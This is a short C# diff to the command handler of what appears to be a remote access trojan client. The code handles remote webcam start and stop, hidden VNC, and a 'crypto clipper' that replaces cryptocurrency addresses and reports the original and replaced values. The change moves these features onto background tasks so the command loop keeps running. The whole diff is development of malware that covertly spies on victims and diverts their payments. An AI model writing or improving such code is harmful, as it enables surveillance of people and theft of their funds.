@@ -200,12 +200,12 @@ internal class TlsClient : IDisposable
                     break;
 
                 case PacketType.WcamStart:
-                    WebcamFeature.Start(
-                        System.Text.Json.JsonSerializer.Deserialize<WcamStartDataStub>(packet.Data, SeroJson.Default.WcamStartDataStub) ?? new(),
-                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct));
+                    var wcamCfg = System.Text.Json.JsonSerializer.Deserialize<WcamStartDataStub>(packet.Data, SeroJson.Default.WcamStartDataStub) ?? new();
+                    _ = Task.Run(() => WebcamFeature.Start(wcamCfg,
+                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, CancellationToken.None)));
                     break;
                 case PacketType.WcamStop:
-                    WebcamFeature.Stop();
+                    _ = Task.Run(() => WebcamFeature.Stop());
                     break;
 
                 case PacketType.HvncStart:
@@ -740,7 +740,8 @@ internal class TlsClient : IDisposable
                                     new ClipperDetectedStub { Type = type, Original = orig, Replaced = rep },
                                     SeroJson.Default.ClipperDetectedStub)
                             }, CancellationToken.None);
-                        CryptoClipperFeature.SetConfig(clipCfg.Enabled, clipCfg.Addresses);
+                        var clipCfgCopy = clipCfg;
+                        _ = Task.Run(() => CryptoClipperFeature.SetConfig(clipCfgCopy.Enabled, clipCfgCopy.Addresses));
                     }
                     break;
 
